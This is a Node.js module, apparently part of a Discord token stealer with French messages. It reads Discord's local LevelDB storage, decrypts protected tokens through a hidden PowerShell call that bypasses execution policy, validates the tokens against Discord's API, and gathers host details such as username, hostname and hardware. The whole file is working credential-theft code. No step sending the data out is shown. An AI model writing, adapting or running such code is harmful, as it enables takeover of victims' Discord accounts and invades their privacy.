'use strict';

const fs = require('fs');
const path = require('path');
const os = require('os');
const { execFileSync } = require('child_process');

const APPDATA = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');

const TARGETS = [
  { name: 'Discord', dir: path.join(APPDATA, 'discord') },
  { name: 'Discord PTB', dir: path.join(APPDATA, 'discordptb') },
  { name: 'Discord Canary', dir: path.join(APPDATA, 'discordcanary') },
  { name: 'Discord Development', dir: path.join(APPDATA, 'discorddevelopment') }
];

const PLAIN_RE = /(mfa\.[A-Za-z0-9_-]{80,120})|([A-Za-z0-9_-]{20,48}\.[A-Za-z0-9_-]{5,16}\.[A-Za-z0-9_-]{25,200})/g;
const STRICT_MFA = /^mfa\.[A-Za-z0-9_-]{80,120}$/;
const STRICT_STD = /^[A-Za-z0-9_-]{20,48}\.[A-Za-z0-9_-]{5,16}\.[A-Za-z0-9_-]{25,200}$/;

function looksLikeToken(value) {
  if (!value) return false;
  const v = String(value).trim();
  return STRICT_MFA.test(v) || STRICT_STD.test(v);
}

function machineInfo() {
  let username = 'inconnu';
  try {
    username = os.userInfo().username;
  } catch (_) {
    username = 'inconnu';
  }
  return {
    hostname: os.hostname(),
    username,
    platform: os.type() + ' ' + os.release(),
    arch: os.arch(),
    cpu: ((os.cpus() || [])[0] || {}).model || 'CPU inconnu',
    ram: Math.round(os.totalmem() / 1073741824) + ' Go'
  };
}

function safeRead(file) {
  try {
    return fs.readFileSync(file).toString('latin1');
  } catch (_) {
    return '';
  }
}

function leveldbFiles(baseDir) {
  const dir = path.join(baseDir, 'Local Storage', 'leveldb');
  let names = [];
  try {
    names = fs.readdirSync(dir);
  } catch (_) {
    return [];
  }
  const out = [];
  for (const name of names) {
    if (!name.endsWith('.ldb') && !name.endsWith('.log')) continue;
    const full = path.join(dir, name);
    let mtime = 0;
    try {
      mtime = fs.statSync(full).mtimeMs;
    } catch (_) {
      mtime = 0;
    }
    out.push({ full, mtime });
  }
  out.sort((a, b) => b.mtime - a.mtime);
  return out.map((entry) => entry.full);
}

function scanPlain(raw) {
  const found = [];
  PLAIN_RE.lastIndex = 0;
  let match;
  while ((match = PLAIN_RE.exec(raw)) !== null) {
    const token = match[0];
    if (token.length >= 50) found.push(token);
  }
  return found;
}

function encryptedCandidates(raw) {
  const set = new Set();
  const re = /[A-Za-z0-9+/]{40,4000}={0,3}/g;
  let match;
  while ((match = re.exec(raw)) !== null) {
    let b64 = match[0];
    const rem = b64.length % 4;
    if (rem !== 0) b64 += '='.repeat(4 - rem);
    let buf;
    try {
      buf = Buffer.from(b64, 'base64');
    } catch (_) {
      continue;
    }
    if (buf.length < 40) continue;
    if (buf[0] === 0x01 && buf[1] === 0x00 && buf[2] === 0x00 && buf[3] === 0x00) {
      set.add(b64);
    }
  }
  return Array.from(set);
}

function dpapiDecryptMany(list) {
  const results = [];
  if (!list.length) return results;

  const CHUNK = 50;
  for (let start = 0; start < list.length; start += CHUNK) {
    const chunk = list.slice(start, start + CHUNK);
    const arrayLiteral = chunk.map((item) => "'" + item + "'").join(',');

    const script =
      "$ErrorActionPreference='SilentlyContinue';" +
      'Add-Type -AssemblyName System.Security;' +
      '$p=@(' + arrayLiteral + ');' +
      'for($i=0;$i -lt $p.Count;$i++){' +
      'try{' +
      '$b=[Convert]::FromBase64String($p[$i]);' +
      '$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);' +
      '[Console]::Out.WriteLine("$i|" + [System.Text.Encoding]::UTF8.GetString($d));' +
      '}catch{}}';

    let out = '';
    try {
      out = execFileSync(
        'powershell.exe',
        ['-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-Command', script],
        { encoding: 'utf8', timeout: 25000, windowsHide: true, maxBuffer: 8 * 1024 * 1024 }
      );
    } catch (_) {
      continue;
    }

    for (const line of out.split(/\r?\n/)) {
      const sep = line.indexOf('|');
      if (sep < 1) continue;
      const index = parseInt(line.slice(0, sep), 10);
      const value = line.slice(sep + 1).trim();
      if (!Number.isNaN(index) && value) {
        results.push({ index: start + index, value });
      }
    }
  }

  return results;
}

async function fetchUser(token) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), 7000);
  try {
    const res = await fetch('https://discord.com/api/v10/users/@me', {
      headers: { Authorization: token },
      signal: controller.signal
    });
    if (!res.ok) return null;
    return await res.json();
  } catch (_) {
    return null;
  } finally {
    clearTimeout(timer);
  }
}

async function grabDiscordToken() {
  const candidates = [];
  const seen = new Set();
  let filesScanned = 0;

  const push = (token, source, encrypted) => {
    const clean = String(token).trim();
    if (!clean || seen.has(clean)) return;
    seen.add(clean);
    candidates.push({ token: clean, source, encrypted: !!encrypted });
  };

  for (const target of TARGETS) {
    if (!fs.existsSync(target.dir)) continue;

    const files = leveldbFiles(target.dir);
    if (!files.length) continue;

    const blobs = [];

    for (const file of files) {
      const raw = safeRead(file);
      if (!raw) continue;
      filesScanned += 1;

      for (const token of scanPlain(raw)) {
        push(token, target.name, false);
      }

      if (blobs.length < 60) {
        for (const blob of encryptedCandidates(raw)) {
          if (blobs.length >= 60) break;
          blobs.push(blob);
        }
      }
    }

    if (blobs.length) {
      const decrypted = dpapiDecryptMany(blobs);
      for (const item of decrypted) {
        let value = item.value;
        if (value.startsWith('{')) {
          try {
            const parsed = JSON.parse(value);
            if (parsed && typeof parsed.token === 'string') value = parsed.token;
          } catch (_) {
            /* ignore */
          }
        }
        if (looksLikeToken(value)) push(value, target.name, true);
      }
    }
  }

  if (!candidates.length) {
    return {
      ok: false,
      filesScanned,
      error:
        "Aucun token trouve. Ouvre Discord, connecte-toi (le token est ecrit au demarrage), puis relance l'analyse."
    };
  }

  let chosen = null;
  let user = null;

  for (const candidate of candidates.slice(0, 6)) {
    const fetched = await fetchUser(candidate.token);
    if (fetched) {
      chosen = candidate;
      user = fetched;
      break;
    }
  }

  if (!chosen) chosen = candidates[0];

  return {
    ok: true,
    token: chosen.token,
    source: chosen.source,
    encrypted: chosen.encrypted,
    candidates: candidates.length,
    filesScanned,
    user
  };
}

module.exports = { grabDiscordToken, machineInfo, looksLikeToken };
